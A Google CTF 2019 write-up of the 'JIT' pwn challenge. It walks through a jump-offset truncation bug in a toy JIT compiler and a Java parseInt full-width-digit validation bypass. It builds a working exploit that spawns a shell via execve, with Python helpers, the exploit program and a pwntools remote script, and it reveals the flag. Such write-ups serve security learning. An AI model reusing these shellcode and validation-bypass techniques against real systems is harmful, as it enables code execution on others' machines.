---
title: "Google CTF 2019 - JIT (pwn)"
date: 2019-05-14
categories: [writeup]
tags: [writeups, pwn]
---

*Author: brnby*

> We read on the internet that Java is slow so we came up with the solution to speed up some computations!

The challenge takes text-based input and translates it at runtime into native x86 instructions before executing them. The input looks like this:
```
MOV(A, 1234)
ADD(A, 20)
RET()
```

It's implemented using a java frontend that performs some basic validation of the input, before handing off to some C code that does the translation and execution. The java frontend can be found in `FancyJIT.java`, and the C backend can be found in `compiler.c`.

Together with my teammate @2019, we got the 10th solve of this challenge.

## Jump encodings
The main vulnerability exists in the encoding of the jump instructions. `JMP(10)` jumps to the 10th line of the program input. The following C code performs the translation:
```c
out[0] = 0xe2;
out[1] = 0x01; // loop ->jmp
out[2] = 0xc3; // ret
out[3] = 0xeb;
out[4] = (intbracket(cmd + 4) - instrno) * 5 - 5; // jmp imm8
```
`intbracket` reads a number from a string until it reaches a closing bracket, and `instrno` is the zero-based line number of the instruction. A `JMP(6)` instruction at line 0, will be converted to the following assembly:
```asm
loop 0x3
ret
jmp 0x1e
```
We'll look at the `loop` instruction later, but for now all we need to know is that it prevents us from causing an infinite loop on the remote server. Also note that the resulting assembly is 5 bytes long. The JIT compiler translates all instructions to 5 bytes even when it could use less, presumably to make the jump calculation easier.

The vulnerability exists in the encoding of the last byte:
```c
out[4] = (intbracket(cmd + 4) - instrno) * 5 - 5; // jmp imm8
```
There's a subtle cast from an integer to a byte during the assignment that can cause the result NOT to be a multiple of 5, allowing us to jump halfway through a 5-byte instruction.
For example, `JMP(53)` will be encoded as `jmp 0x6`, which jumps four bytes into the next 5 bytes of instructions.
```
(53 - 0) * 5 - 5 = 0x104
(byte)0x104 = 0x04
\xeb\x04 -> jmp 0x6
```
In theory, there should be a value that causes us to jump 1 byte into the next 5 byte instruction.

To turn this into something useful, we can make use of a *MOV*, *ADD*, *SUB* or *CMP* instruction, which contains 4 user controlled bytes.
```c
out[0] = 0xb8; // mov eax, imm32
*((int*)(out + 1)) = intbracket(cmd + 7);
```
Combined with a malicious jump instruction, this lets us execute 4 bytes of arbitrary code. In order to prove the theory, we need to set up an environment in which we can debug our programs in GDB.

## Debug environment
Ideally, we'd like to have the debug environment run our programs through the java frontend first, but attaching a debugger to the JIT compiler instance started by java seems hard. Instead, I ignored this and modified the compiler code instead.

The challenge author included a main function in `compiler.c` that executes an embedded program and prints the result:
```c
int main() {
  const char* prog[] = {
    "MOV(A, 10)",
    "STR(A, 1)",
    "MOV(A, 1)",
    "MOV(B, 1)",
    "STR(A, 2)",
    "STR(B, 3)",
    "LDR(A, 2)",
    "LDR(B, 3)",
    "SUM()",
    "STR(B, 2)",
    "STR(A, 3)",
    "LDR(A, 1)",
    "SUB(A, 1)",
    "STR(A, 1)",
    "CMP(A, 0)",
    "JEQ(17)",
    "JMP(6)",
    "LDR(A, 2)",
    "RET()",
  };
  int res = run(prog, sizeof(prog)/sizeof(prog[0]));
  printf("res = %d\n", res);
}
```

To avoid recompiling every time we want to test a new program, I changed this to read from a file instead:
```c
int main() {
  // Read the input in from a file line by line.
  FILE *file_pointer = fopen("input", "r");
  size_t len = 0;
  ssize_t read = 0;
  char *lines[800] = { 0 };
  int i = 0;
  while ((read = getline(&lines[i], &len, file_pointer)) != -1) {
          printf(lines[i]);
          i += 1;
  }
  fclose(file_pointer);

  printf("Number of lines: %d\n", i);

  int res = run(lines, i);
  printf("res = %d\n", res);
}
```

I also created a `debug.sh` script that pauses at the start of the JIT compiled instructions.
```bash
#! /bin/sh
gcc -g -o compiler_debug compiler_debug.c
gdb -x gdbinit ./compiler_debug
```
```gdb
# gdbinit
b compiler_debug.c:132
r
si
si
si
si
si
si
```

For example, if the program is just a single *RET*, the `debug.sh` script lands at:
![Debug landing](/images/google19/jit/debug_landing.png)

## Verifying the jump vulnerability
Now that we have a debugger, we can prove that jump can be used to execute 4 bytes of arbitrary code. First, we need to find a jump value that jumps to a convenient location. The perfect jump value is one that executes the last 4 bytes of the next instruction.
```
JMP(<perfect_value>)
MOV(A, <encoded_instructions>)
```

This requires a `jmp 0x03` instruction, which in binary is `\xeb\x01`. Remembering the JIT translation code for *JMP* instructions, this requires `out[4]` to be `0x01`.
```c
out[3] = 0xeb;
out[4] = (intbracket(cmd + 4) - instrno) * 5 - 5; // jmp imm8
```
We can calculate the jump constant using a small snippet of python:
```python
def intbracket(int_string):
    result = 0

    for c in int_string:
        result = result * 10 + ord(c) - 0x30

    return result


def find_jump_value(instruction_number):
    for i in range(800):
        converted_value = (intbracket(str(i)) - instruction_number) * 5 - 5
        single_byte_value = converted_value & 0xff

        if single_byte_value == 0x01:
            pwn.log.info("{} -> {} -> {}".format(i, hex(converted_value), hex(single_byte_value)))
            return i
    else:
        pwn.log.error("Jump instruction not found :(")
```
For instruction number 0, the perfect jump constant is 206.

Next we need to encode some arbitrary instructions into a number. Once again, python comes to the rescue:
```python
def encode_asm_as_imm32(instructions):
    shellcode = pwn.asm(instructions)

    # Pad out to 4 bytes.
    if len(shellcode) > 4:
        pwn.log.error("\"{}\" encodes to {} bytes, which cannot be encoded as a 32-bit integer, shorten it to 4 bytes or less.".format(instructions, len(shellcode)))
    four_byte_shellcode = shellcode.ljust(4, '\x00')

    return pwn.u32(four_byte_shellcode)
```

Combining this all together:
```python
jump_value = find_jump_value(0)
encoded_asm_constant = encode_asm_as_imm32("pop eax; pop ebx; pop ecx; pop edx")

print("JMP({})".format(jump_value))
print("MOV(A, {})".format(encoded_asm_constant))
```
```
JMP(206)
MOV(A, 1515805528)
```

And lastly, running this program through the debugger shows that we can indeed execute 4 bytes of arbitrary code.
![JMP(206) proof](/images/google19/jit/jmp_206_proof.png)

## Java limitiations
Using what we have so far, we can write a program that spawns a shell in the debug environment. However, the java frontend adds a few limitations that will prevent it from working on the actual server.

The first limitiation is that *MOV*, *ADD*, *SUB* and *CMP* instructions can only use a constant with a maximum value of 99999, which stops us from encoding 4 arbitrary bytes of code:
```java
case "MOV":
    if (instr.arg < 0 || instr.arg > 99999) {
        return false;
    }
    break;
case "ADD":
case "SUB":
case "CMP":
    if (instr.arg < 0 || instr.arg > 99999 || instr.reg != 'A') {
        return false;
    }
    break;
```

The second is that the *JMP* constant must be within 20 places of the current line number, preventing us from using a `JMP(206)` as the first instruction.
```java
case "JMP":
case "JNE":
case "JEQ":
    if (instr.arg < 0 || instr.arg >= program.length || Math.abs(i - instr.arg) > 20) {
        return false;
    }
    break;
```

We'll tackle these problems separately.

### Maximum constant workaround
The maximum value we can use for a constant is 99999 or `0x01869F`. When using constants to encode instructions, this essentially limits us to 2 arbitrary bytes of code. If we actually try and run a 2 byte instruction using the `JMP(206)` technique, the binary will segfault.
```
JMP(206)
MOV(A, 23384) // pop rax; pop rbx
RET()
```
![2 byte segfault](/images/google19/jit/2_byte_segfault.png)

This occurs because we're still executing 4 bytes of code, it's just that the last two are null bytes. The null bytes decode to a `add byte ptr [rax], al` instruction that segfaults because `rax` points to a non-writable page of memory.

Before the segfault occurs, we still have the chance to execute two bytes of code. We can take advantage of this to set `rax` to a writable address in memory. We know that `r12` already points to a writable region of memory, because it's used by the *STR* instruction.
```c
out[0] = 0x41;
out[1] = 0x89;
if (cmd[4] == 'A') {
  out[2] = 0x44; // mov [r12+imm8], eax
} else {
  out[2] = 0x5c; // mov [r12+imm8], ebx
}
out[3] = 0x24;
out[4] = 4 * intbracket(cmd + 7);
```

Annoyingly, `push r12; pop rax` is 3 bytes long:
```
0:  41 54                   push   r12
2:  58                      pop    rax 
```

Fortunately, it turns out that `rsi` is pointng to the same address as `r12`:
![registers](/images/google19/jit/registers.png)

So we can use a `push rsi; pop rax` to solve the issue.
```
0:  56                      push   rsi
1:  58                      pop    rax 
```

The FancyJIT translation is:
```
JMP(206)
MOV(A, 22614) // push rsi, pop rax
RET()
```

We're now limited to 2 arbitrary bytes of code at a time, which should still be enough to spawn a shell.

### Close JMP workaround
The following checks prevent us from supplying arbitrary values to jump instructions:
```java
case "JMP":
case "JNE":
case "JEQ":
    if (instr.arg < 0 || instr.arg >= program.length || Math.abs(i - instr.arg) > 20) {
        return false;
    }
    break;
```

In particular, the jump value needs to be within 20 of the instruction number, which stops us from using `JMP(206)` as the first instruction. My first thought here was to simply place the instruction at line 200 of the program. Although this bypasses the java checks, it is no longer encoded as `\xeb\x01`, because the instruction number is subtracted from the constant by the JIT compiler.
```c
out[4] = (intbracket(cmd + 4) - instrno) * 5 - 5;
(206 - 200) * 5 - 5 = 0x19
\xeb\x19 -> jmp 0x1b // Should be jmp 0x1!
```

This had us stumped for a while. My teammate, @2019, realised that `Integer.parseInt` accepts unicode full-width digits, allowing us to specify strings that produce very different jump constants in the java front-end and the JIT compiler backend. For example, the unicode character `U+FF10` is parsed by `Integer.parseInt` as a 0, and parsed by `intbracket` as 20596.

The unicode to binary conversions go like this:

| Digit | Unicode character | Binary representation |
|-------|-------------------|-----------------------|
| 0     | U+FF10            | "\xef\xbc\x90"        |
| 1     | U+FF11            | "\xef\xbc\x91"        |
| 2     | U+FF12            | "\xef\xbc\x92"        |
| 3     | U+FF13            | "\xef\xbc\x93"        |
| ...   |                   |                       |

We need to find a unicode full-width digit string that bypasses the java checks and results in an `\xeb\x01` jump instruction. Once again, we can write some python to find it for us:
```python
def find_unicode_jump_value(instruction_number):
    prefix = ""

    for j in range(10):
        for i in range(100):
            int_string = prefix + str(i)
            converted_value = (intbracket(int_string) - instruction_number) * 5 - 5
            single_byte_value = converted_value & 0xff

            if single_byte_value == 0x01:
                pwn.log.info("{} -> {} -> {}".format(int_string, hex(converted_value), hex(single_byte_value)))
                return int_string

        prefix += "\xef\xbc\x90" # Full-width zero
    else:
        pwn.log.error("Jump instruction not found :(")
```

The result is 2 full-width zeroes followed by an ASCII 6:
```
[*] ００6 -> 0x3d713701 -> 0x1
JMP(００6)
```

## Writing the exploit
Now we have all the pieces we need to build a full exploit. As the debuggers going to be super useful, we'll once again forget about the java frontend and develop the exploit purely in the debugging environment. The plan is to perform an `execve("/bin/sh", NULL, NULL)` syscall. We'll also break the work into several stages to make the writeup easier to digest.

### Storing /bin/sh in memory
Firstly, we'll need a `/bin/sh` string at a known location in memory. We can construct our own using the *STR* instruction, which lets us store the value of `eax` (4 bytes) in the writable data segment. The address of the writable data segment is stored in `r12`.

We can use pwntools to convert each 4 byte section of `/bin/sh` into integers.
```python
>>> import pwn
>>> pwn.u32("/bin")
1852400175
>>> pwn.u32("/sh\x00")
6845231
```

Remember that the maximum constant we can specify is 99999, so we can't just do:
```
MOV(A, 1852400175)
STR(A, 0)
```

We'll need to use *ADD* in order to get these values into `eax`. We could of course do this by copy and pasting the *ADD* instruction, but we'd need 18524 of them and we're only allowed to use 800 lines:
```
MOV(A, 99999)
ADD(A, 99999)
...
STR(A, 0)
```

Instead, we'll need to make use of the *CMP* and *JNE* instructions to construct a loop. We're trying to write something like the following pseudo code:
```c
eax = 18699
for (int i = 0; i != 18524; i++) {
    eax += 99999;
}
// eax should equal 1852400175
```

Frustratingly, the comparison operator compares against `eax`, so we'll need to store the loop counter in memory and swap it in and out. Written in FancyJIT, this becomes:
```
MOV(A, 0)
STR(A, 10)
MOV(A, 18699)
STR(A, 0)
LDR(A, 0)
ADD(A, 99999)
STR(A, 0)
LDR(A, 10)
ADD(A, 1)
STR(A, 10)
CMP(A, 18524)
JNE(4)

// Store the value we constructed in eax and then return. The value should be printed by the program.
LDR(A, 0)
RET()
```

If you run this, you'll notice that the result is always 10000, when it should be 1852400175. After some debugging, I discovered that we actually exit the loop early. To see why, we need to take a look at the encoding of the jump instruction:
```c
out[0] = 0xe2;
out[1] = 0x01; // loop ->jne
out[2] = 0xc3; // ret
out[3] = 0x75;
out[4] = (intbracket(cmd + 4) - instrno) * 5 - 5; // jne imm8
```
```asm
loop 0x3
ret
jne 0x6
```

The [loop instruction](https://c9x.me/x86/html/file_module_x86_id_161.html) uses `ecx` to implement a simple looping primitive. If the value in `ecx` is NOT zero, we jump by the amount specified. If it IS zero, the next instruction is executed. In our case, `ecx` is initially set to 10000 by the init stub.
```c
__asm(
    "\n\tpush %%r12"
    "\n\tpush %%rbx"
    "\n\tmov $10000, %%rcx" // ecx set here
    "\n\tmov %1, %%rax"
    "\n\tmov %2, %%r12"
    "\n\tcall *%%rax"
    "\n\tpop %%rbx"
    "\n\tpop %%r12"
    "\n\tmov %%rax, %0"
    : "=r"(res)
    : "r"(jit.text), "r"(jit.data)
    : "rax", "rcx", "cc", "memory"
      );
```
Every time we perform a `JMP` the value is decremented and when it reaches zero the program returns. This basically implements a maximum number of loops, presumably to stop someone from causing an infinite loop on the remote server.

As we need more than 10000 jumps, we'll need to set `ecx` to something much larger. Setting it to zero provides us with the 2^64 jumps, because `ecx` is decremented before comparing it to zero. We'll use the `push rsi; pop rax` stub along with a `xor ecx, ecx` instruction to change it's value. Combining this with the unicode tricks discussed earlier, we get:
```
JMP(００6)
MOV(A, 22614) // push rsi; pop rax

JMP(００8)
MOV(A, 51505) // xor ecx, ecx

MOV(A, 0)
STR(A, 10)
MOV(A, 18699)
STR(A, 0)
LDR(A, 0)
ADD(A, 99999)
STR(A, 0)
LDR(A, 10)
ADD(A, 1)
STR(A, 10)
CMP(A, 18524)
JNE(8) // Needed to be changed from 4 to 8 as we have 4 extra instructions at the beginning.

// Store the constructed value in eax and return so that it's printed. Makes checking for success easier.
LDR(A, 0)
RET()
```

We can repeat the same process to get `/sh` into position 1.
```
JMP(００6)
MOV(A, 22614) // push rsi; pop rax

JMP(００8)
MOV(A, 51505) // xor ecx, ecx

// Store /bin into position 0.
MOV(A, 0)
STR(A, 10)
MOV(A, 18699)
STR(A, 0)
LDR(A, 0)
ADD(A, 99999)
STR(A, 0)
LDR(A, 10)
ADD(A, 1)
STR(A, 10)
CMP(A, 18524)
JNE(8)

// Store /sh into position 1.
MOV(A, 0)
STR(A, 10)
MOV(A, 45299)
STR(A, 1)
LDR(A, 1)
ADD(A, 99999)
STR(A, 1)
LDR(A, 10)
ADD(A, 1)
STR(A, 10)
CMP(A, 68)
JNE(20)

// Store the constructed value in eax and return so that it's printed. Makes checking for success easier.
LDR(A, 1)
RET()
```
![/bin/sh in r12](/images/google19/jit/bin_sh_r12.png)

### Execve syscall
We'll use 2 byte instructions to perform an `execve(/bin/sh)` syscall. Remember that `eax` no longer points to the data segment, so we'll need to fix it again to prevent segfaults.
```
JMP(００26)
MOV(A, 22614) // push rsi; pop rax
```

Next, we need to get the pointer to `/bin/sh` into `rdi`. We'll do this using `push rsi; pop rdi`.
```
JMP(００28)
MOV(A, 24406) // push rsi; pop rdi
```

Now we'll set rsi and rdx to null.
```
JMP(００30)
MOV(A, 63025) // xor rsi, rsi

JMP(００32)
MOV(A, 53809) // xor rdx, rdx
```

We also need to set rax to `0x3b`, which is the execve syscall number, but remember that once we do this, the 2 byte instructions will break again. If we do it using a regular `MOV` instruction instead of a 2 byte instruction, we can avoid any issues.
```
MOV(A, 59)
```

Finally, perform the syscall.
```
JMP(００35)
MOV(A, 1295) // syscall
```

## Solving the challenge
Whilst this works in the compiler, we need to run it through the remote java interface. Given that we've already got the program in a file, we'll simply send it's contents using pwntools:
```python
#! /usr/bin/env python2
import pwn

def main():
    if pwn.args.REMOTE:
        challenge = pwn.remote("jit.ctfcompetition.com", 1337)
    elif pwn.args.GDB:
        pwn.log.error("DEBUGGING THIS IS HAARDD")
    else:
        challenge = pwn.process("./run.sh")

    with open("input", "r") as input_file:
        payload = input_file.read()

    challenge.sendline(payload)
    challenge.sendline("")

    challenge.interactive()


if __name__ == "__main__":
    main()
```

## Flag
```
CTF{8röther_m4y_1_h4v3_söm3_nümb3r5}
```
